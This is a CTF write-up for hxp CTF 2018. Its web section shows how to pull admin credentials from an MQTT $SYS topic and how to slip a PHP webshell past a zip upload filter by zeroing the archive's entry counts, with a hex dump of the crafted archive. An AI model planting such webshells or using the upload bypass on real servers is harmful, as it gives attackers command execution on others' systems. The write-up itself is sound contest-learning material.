# hxp CTF 2018

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20181207-hxpctf/) of this writeup.**


 - [hxp CTF 2018](#hxp-ctf-2018)
   - [Crypto](#crypto)
     - [blind](#blind)
     - [oops2](#oops2)
     - [curve12833227](#curve12833227)
     - [blinder](#blinder)
     - [blinder_v2](#blinder_v2)
   - [Web](#web)
     - [time for h4x0rpsch0rr?](#time-for-h4x0rpsch0rr)
     - [unpack0r](#unpack0r)
       - [Failed Attempts](#failed-attempts)
     - [µblog](#µblog)
       - [Failled Attempts](#failled-attempts)


## Crypto

### blind

sasdf

https://sasdf.cf/ctf/writeup/2018/hxp/crypto/blind/

### oops2

sasdf

https://sasdf.cf/ctf/writeup/2018/hxp/crypto/oops/

### curve12833227

sasdf

https://sasdf.cf/ctf/writeup/2018/hxp/crypto/curve/

### blinder

sasdf

https://sasdf.cf/ctf/writeup/2018/hxp/crypto/blinder/

### blinder_v2

sasdf

https://sasdf.cf/ctf/writeup/2018/hxp/crypto/blinder_v2/

## Web

### time for h4x0rpsch0rr?

bookgin

The website uses MQTT websocket to receive the temperature.

```htmlmixed
...

<script src="mqtt.min.js"></script>
<script>
  var client = mqtt.connect('ws://159.69.212.240:60805')
  client.subscribe('hxp.io/temperature/Munich');
</script>
```

And there is admin panel, but username, password and OTP are required to login.

Let's take a look at the [document](https://www.hivemq.com/blog/mqtt-essentials-part-5-mqtt-topics-best-practices/). It does support wildcard charcaters.

>If you specify only the multi-level wildcard as a topic (#), you receive all messages that are sent to the MQTT broker.

I try to subscribe `#`, but no other messages are received. In the document, topics beginning with `$`  are not part of the subscription when you subscribe to the multi-level wildcard as a topic (#). 

Next is to subscribe `$SYS/#`. Bingo! I receive the message from `$internal/admin/webcam` channel. The message is actually an image. Decoding this image we will get admin's username, password and OTP. Login to the admin panel and get the flag. Note that the OTP will change in a few seconds.

```
curl 'http://159.69.212.240:8001/admin.php' -d 'user=iot_fag&password=I<3SecurID&otp=861729' -sD -
```

### unpack0r

bookgin

For the server side source code, please refer to [writeup by graneed](https://graneed.hatenablog.com/entry/2018/12/09/220317).

Basically, the server will unzip the file. However, the filename can only contain a-z. We cannot directly upload a webshell or `.htaccess`. 

The most notable thing here is the server uses php zip to check the filename, but it uses linux `unzip` to decompress the file. It's possible we can take advantage of this inconsistency. In the source, it uses php `zip->numFiles` and iterates each file to check the filename. What if we can make `zip->numFiles` return a incorrect number? So the plan is

1. zip a webshell `shell.php`
2. Make `zip->numFiles` return 0.
3. The zip file can still be decompressed by linux `unzip`.

Here is a [great document](https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html) describing the ZIP file format. in the end of central directory record, there are two attributes `Disk entry` and `Total entry`. Just patch number to zero (0x00) and we can upload the webshell.

```shell
$ xxd a.zip
00000000: 504b 0304 0a00 0000 0000 765a 884d 256d  PK........vZ.M%m
00000010: ec8c 1800 0000 1800 0000 0900 1c00 6161  ..............aa
00000020: 6161 612e 7068 7055 5409 0003 20ef 0b5c  aaa.phpUT... ..\
00000030: 20ef 0b5c 7578 0b00 0104 e803 0000 04e8   ..\ux..........
00000040: 0300 003c 3f70 6870 0a73 7973 7465 6d28  ...<?php.system(
00000050: 245f 4745 545b 5f5d 293b 0a50 4b01 021e  $_GET[_]);.PK...
00000060: 030a 0000 0000 0076 5a88 4d25 6dec 8c18  .......vZ.M%m...
00000070: 0000 0018 0000 0009 0018 0000 0000 0001  ................
00000080: 0000 00a4 8100 0000 0061 6161 6161 2e70  .........aaaaa.p
00000090: 6870 5554 0500 0320 ef0b 5c75 780b 0001  hpUT... ..\ux...
000000a0: 04e8 0300 0004 e803 0000 504b 0506 0000  ..........PK....
000000b0: 0000 0000 0000 4f00 0000 5b00 0000 0000  ......O...[.....
```

#### Failed Attempts
- zip a symbolic link
    - The server side seems to block symbolic links. It will return 403 Forbidden when trying to access symbolic links.
- zip a large number of files
    - There seems to be [a bug](http://php.net/manual/en/class.ziparchive.php#116937) when ziping more than 65,535 files. However I cannot reproduce this in PHP 7.2.
- Prepend local file header and data
    - The PHP will fail to parse the zip file

### µblog

unsolved, bookgin

Please refer to [herrera's writeup](https://github.com/lbherrera/writeups/tree/master/hxp-2018/blog). His writeup is very impressive! Also, full credit to the author of the challenge @_0xbb_. This is definitely one of the best web challenge I've seen this year.

#### Failled Attempts
- XSS in `$(location.hash)`
    - [The bug](https://bugs.jquery.com/ticket/9521) is fixed in 2012.
    - Nowadays the lateest browsers will encode the string in `location.hash`
- Leak url thorugh referer
    - It's totally useless because admin will never visit `/?id=ADMIN_ID`
    - In Chrome 70 there is [bug](https://bugs.chromium.org/p/chromium/issues/detail?id=884505&can=1&q=Referrer%20Policy&colspec=ID%20Pri%20M%20Stars%20ReleaseBlock%20Component%20Status%20Owner%20Summary%20OS%20Modified) used to bypass referer policy, but we cannot control the html attributes.
- img CSRF
    - However, I can only send GET request in img-src. Nothing can be exploited.
- [script gadgets](https://github.com/google/security-research-pocs/tree/master/script-gadgets)
    - We still need somewhere we can inject our XSS, but the page escapes all the html special characters.
